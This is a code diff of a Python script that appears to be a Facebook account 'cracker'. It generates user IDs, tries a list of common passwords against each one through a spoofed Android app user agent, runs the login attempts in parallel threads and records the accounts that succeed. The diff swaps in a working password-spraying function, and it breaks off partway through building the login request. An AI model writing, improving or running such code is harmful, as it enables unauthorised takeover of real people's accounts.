@@ -84,23 +84,27 @@ def Main():
 		print('<> CRACK STARTED....... ')
 		print(50*'━')
 		for guru in user:
-			
-def login():
-    os.system("clear")
-    print("\033[1;37m")
-    uid = love+lova+lovb+guru
-    pww = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
-    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
-    check(uid, pww, ua)
-  
-  print(50*'━')
-  print(' <> CRACK DONE......... ')
-  print(50*'━')
-  exit()
-
-def check(uid, pww, ua):
+			uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
+			ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
+			yaari.submit(test,uid,pwx,tl)
+	print(50*'━')
+	print(' <> CRACK DONE......... ')
+	print(50*'━')
+	exit()
+def test(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
     try:
-        data = {
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r\033[1;90m[\033[1;92mRJ-404\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
             "adid": str(uuid.uuid4()),
             "device_id": str(uuid.uuid4()),
             "email": uid,
